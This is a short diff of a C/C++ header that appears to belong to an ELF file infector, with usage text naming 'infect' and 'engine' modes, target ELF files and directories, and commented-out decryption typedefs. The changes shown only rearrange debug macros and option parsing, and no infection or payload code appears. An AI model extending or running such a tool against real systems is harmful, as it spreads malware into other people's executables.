@@ -1,26 +1,11 @@
-#define DEBUGGING 0
-
-#if DEBUGGING == 0
-	#define DEBUG(s) 
-	#define DEBUG2(s1, s2)
-	#define ERROR(s)
-#elif DEBUGGING == 1
-	#define DEBUG(s) 
-	#define DEBUG2(s1, s2)
-	#define ERROR(s) (std::cout << "[!!] " << s << "\n")
-#else
-	#define DEBUG(s) (std::cout << s << "\n")
-	#define DEBUG2(s1, s2) (std::cout << s1 << s2 << "\n")
-	#define ERROR(s) (std::cout << "[!!] " << s << "\n")
-#endif
 
 
 
 
 
 
-#define OPTSTR "vi:o:d:e:h"
-#define USAGE_FMT  "%s -m mode [-v] [ [-i inputfile] [ [-o outputfile] | -e targetelf | -d targetdir ] ]  [-h]"
+#define OPTSTR "m:vi:o:d:e:h"
+#define USAGE_FMT  "%s -m mode [-v] [-i inputfile] [ [-o outputfile] | -e targetelf | -d targetdir ]] [-h]"
 #define ERR_MODE "invalid mode option. mode = [infect|engine]\n"
 #define ERR_INPUT_OPEN "can't open input file\n"
 #define ERR_INPUT_MALLOC "can't allocate memory for input file\n"
@@ -44,7 +29,7 @@
 
 #define ELF_MAGIC_NUMBER "\177ELF"
 #define INFO_BANNER "\x1b[1;34m[INFO]\x1b[0m"
-#define VERBOSE options->verbose == 1
+#define VERBOSE options->verbose
 
 
 //typedef long(*DecryptionProc)(long);
@@ -63,3 +48,19 @@
 
 //typedef unsigned int(*DecryptionProc)(void *);
 
+
+#define DEBUGGING 2
+
+#if DEBUGGING == 0
+	#define DEBUG(s) 
+	#define DEBUG2(s1, s2)
+	#define ERROR(s)
+#elif DEBUGGING == 1
+	#define DEBUG(s) 
+	#define DEBUG2(s1, s2)
+	#define ERROR(s) (std::cout << "[!!] " << s << "\n")
+#else
+	#define DEBUG(s) (std::cout << INFO_BANNER << s << "\n")
+	#define DEBUG2(s1, s2) (std::cout << INFO_BANNER << s1 << s2 << "\n")
+	#define ERROR(s) (std::cout << "[!!] " << s << "\n")
+#endif
